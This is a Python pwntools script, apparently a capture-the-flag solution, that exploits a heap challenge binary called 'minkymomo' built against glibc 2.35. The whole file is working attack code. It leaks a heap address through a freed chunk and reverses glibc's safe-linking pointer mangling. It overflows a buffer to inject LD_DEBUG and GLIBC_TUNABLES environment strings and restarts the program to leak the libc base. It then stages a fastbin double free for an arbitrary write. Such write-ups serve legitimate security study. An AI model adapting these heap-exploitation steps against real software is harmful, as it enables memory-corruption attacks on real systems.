from pwn import *

#init

e = ELF('./minkymomo')
libc = ELF('./libc-2.35.so')

p = process(e.path)
#p = remote()

#funcs

def add(x, y, s = b'minky'):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y)) 
    p.sendlineafter('?', s)

def fre(x):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))

def rd(x):
    p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))

    p.recvuntil(': ')
    return p.recvline(keepends = False)

def rstr(s):
    p.sendlineafter('?', b'4'.ljust(0x148, b'a') + s)
    print()
    log.info('Restarted Program!')

def ex():
    p.sendlineafter('?', '5')

def deobf(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obf(p, adr):
    return p^(adr>>12)

#vars

#exploit

#leak heap by inputting invalid scanf num

add(0, 0x17)
add(1, 0x17)
fre(1)
fre(0)

heap = deobf(u64(rd(0).ljust(8, b'\x00'))) - 0x16e0 
log.info('Heap adr: ' + hex(heap))

#set fake env vars on heap

add(2, 0x37, b'LD_DEBUG=files')
add(3, 0x37, b'GLIBC_TUNABLES=glibc.malloc.tcache_count=2')

#use overflow overwrite env then restart with new env set

s = p64(heap + 0x16c0 + 0x40)
s += p64(heap + 0x16c0 + 0x40 + 0x40)
s += p64(0)

rstr(s)

#get libc from ld_debug

p.recvuntil('base: ')
libc_off = int(p.recvuntil(' ', drop = True), 16)

log.info('Libc off adr: ' + hex(libc_off))

#use small tcache_count to set up fastbin dup

add(0, 0x17)
add(1, 0x17)

add(2, 0x17)
add(3, 0x17)

fre(0)
fre(1)

fre(2)
fre(3)
fre(2)

add(4, 0x17)
add(5, 0x17)

add(6, 0x17, p64(0x694201337000))
add(7, 0x17)

add(8, 0x17)

#pray for flag

p.interactive()
